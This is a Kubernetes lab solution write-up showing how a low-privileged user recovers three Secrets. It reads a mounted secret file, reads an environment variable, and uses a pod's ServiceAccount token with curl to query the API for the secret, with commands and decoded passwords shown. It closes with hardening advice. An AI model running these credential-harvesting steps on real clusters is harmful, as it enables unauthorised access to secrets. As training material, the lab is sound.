# ✅ SOLUTION — Lab: Escaping Secret Restrictions with Pod Workarounds

This solution walks through how a user with very restricted permissions can still exfiltrate the contents of Secrets using clever observation of the Pod configuration and access methods.

---

## 🔁 Step 1: Switch to restricted context

```bash
kubectl config use-context restricted@infra-prod
```

This simulates a low-privileged user who cannot list or get Secrets directly.

```
$ k -n team-red get secrets
Error from server (Forbidden): secrets is forbidden: User "system:serviceaccount:team-red:restricted" cannot list resource "secrets" in API group "" in the namespace "team-red"
```

## 🔍 Step 2: Explore the environment

```bash
kubectl get pods -n team-red
NAME       READY   STATUS    RESTARTS   AGE
pod/pod1   1/1     Running   0          79s
pod/pod2   1/1     Running   0          79s
pod/pod3   1/1     Running   0          79s
```

You should see the 3 running pods: `pod1`, `pod2`, `pod3`

---

## 🔐 Secret 1 (Mounted Volume)

Inspect the pod :

```
$ k -n team-red describe pod/pod1
...
    Mounts:
      /etc/secret-volume from secret-vol (rw)
      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-2qhzz (ro)
...

$ k -n team-red exec pod1 -- ls -la /etc/secret-volume/
total 4
drwxrwxrwt    3 root     root           100 Apr 15 15:59 .
drwxr-xr-x    1 root     root          4096 Apr 15 15:59 ..
drwxr-xr-x    2 root     root            60 Apr 15 15:59 ..2025_04_15_15_59_04.492721276
lrwxrwxrwx    1 root     root            31 Apr 15 15:59 ..data -> ..2025_04_15_15_59_04.492721276
lrwxrwxrwx    1 root     root            15 Apr 15 15:59 password -> ..data/password

$ k -n team-red exec pod1 -- cat /etc/secret-volume/password
This-IS
```


## 🔐 Secret 2 (Environment Variable)

Inspect pod2 :

```
$ k -n team-red describe pod/pod2
...
Containers:
  c2:
  ...
    Environment:
      PASSWORD:  <set to the key 'PASSWORD' in secret 'secret2'>  Optional: false
...

$ k -n team-red exec pod2 -- env | grep PASSWORD
PASSWORD=the-suP3r
```

## 🔐 Secret 3 (ServiceAccount Token + Kubernetes API)

This one is more subtle and relies on understanding how a pod can use its mounted **ServiceAccount token** to query the Kubernetes API directly.

### 🔎 Step A — Find which pod has the token mounted

```
$ k -n team-red get pod pod3 -o yaml | grep -i serviceAccount
      {"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{},"name":"pod3","namespace":"team-red"},"spec":{"automountServiceAccountToken":true,"containers":[{"command":["sleep","3600"],"image":"curlimages/curl","name":"c3"}],"serviceAccountName":"pod-sa"}}
  automountServiceAccountToken: true
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
  serviceAccount: pod-sa
  serviceAccountName: pod-sa
      - serviceAccountToken:
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
```
Make sure `automountServiceAccountToken: true` is enabled (default behavior) :

```
$ $ k -n team-red get pod pod3 -o yaml | grep -i automount
      {"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{},"name":"pod3","namespace":"team-red"},"spec":{"automountServiceAccountToken":true,"containers":[{"command":["sleep","3600"],"image":"curlimages/curl","name":"c3"}],"serviceAccountName":"pod-sa"}}
  automountServiceAccountToken: true
```

### 🔐 Step B — Enter the pod
```bash
$ k -n team-red exec -it pod3 -- sh
```
Inside the shell, inspect the directory:
```sh
$ ls -la /run/secrets/kubernetes.io/serviceaccount
total 4
drwxrwxrwt    3 root     root           140 Apr 15 15:59 .
drwxr-xr-x    3 root     root          4096 Apr 15 15:59 ..
drwxr-xr-x    2 root     root           100 Apr 15 15:59 ..2025_04_15_15_59_05.2109065701
lrwxrwxrwx    1 root     root            32 Apr 15 15:59 ..data -> ..2025_04_15_15_59_05.2109065701
lrwxrwxrwx    1 root     root            13 Apr 15 15:59 ca.crt -> ..data/ca.crt
lrwxrwxrwx    1 root     root            16 Apr 15 15:59 namespace -> ..data/namespace
lrwxrwxrwx    1 root     root            12 Apr 15 15:59 token -> ..data/token
```
You see: `token`, `ca.crt`, `namespace`

### 🔐 Step C — Use curl to access the API

We get the token :

```sh
$ TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
```

Call the secrets endpoint using the API reference : https://kubernetes.io/docs/reference/kubernetes-api/config-and-storage-resources/secret-v1/#get-read-the-specified-secret

```sh
$ curl -sSk -H "Authorization: Bearer $TOKEN" https://kubernetes.default/api/v1/namespaces/team-red/secrets/secret3
{
  "kind": "Secret",
  "apiVersion": "v1",
  "metadata": {
    "name": "secret3",
    "namespace": "team-red",
    "uid": "4720e9e6-fe4e-4e30-aa9d-34e5281bfa13",
    "resourceVersion": "174952",
    "creationTimestamp": "2025-04-15T16:31:10Z",
    "annotations": {
      "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Secret\",\"metadata\":{\"annotations\":{},\"name\":\"secret3\",\"namespace\":\"team-red\"},\"stringData\":{\"password\":\"pAssw0rd\"}}\n"
    },
    "managedFields": [
      {
        "manager": "kubectl-client-side-apply",
        "operation": "Update",
        "apiVersion": "v1",
        "time": "2025-04-15T16:31:10Z",
        "fieldsType": "FieldsV1",
        "fieldsV1": {
          "f:data": {
            ".": {},
            "f:password": {}
          },
          "f:metadata": {
            "f:annotations": {
              ".": {},
              "f:kubectl.kubernetes.io/last-applied-configuration": {}
            }
          },
          "f:type": {}
        }
      }
    ]
  },
  "data": {
    "password": "cEFzc3cwcmQ="
  },
  "type": "Opaque"

```

Notes :
- `curl -sSk -H "Authorization: Bearer $TOKEN" https://kubernetes.default/api/v1/namespaces/<NAMESPACE>/secrets/<SECRET_NAME>`
- To find the ULR for API search in Kubernetes documentation "API from pod", you will find this page : https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/

### 📦 Step D — Parse the result
You’ll get JSON output similar to:
```json
  "data": {
    "password": "cEFzc3cwcmQ="
```

The value of the secret is base64-encoded.

### 🔐 Step E — Decode and save
```sh
$ echo cEFzc3cwcmQ= | base64 -d 
pAssw0rd
```

✅ All 3 secrets have been successfully retrieved by leveraging what the pods were already allowed to see.


## 🔚 Step 3: Return to admin context

```bash
kubectl config use-context kubernetes-admin@kubernetes
```

## 💡 Tips and Notes

- Never assume that denying Secret `get` or `list` API calls is enough — pods can still expose secrets via mounts or env vars.
- ServiceAccount tokens allow pods to access the API — this should be limited or disabled if not necessary (`automountServiceAccountToken: false`).
- A stricter security design would enforce validation or scanning of pod configurations before scheduling.


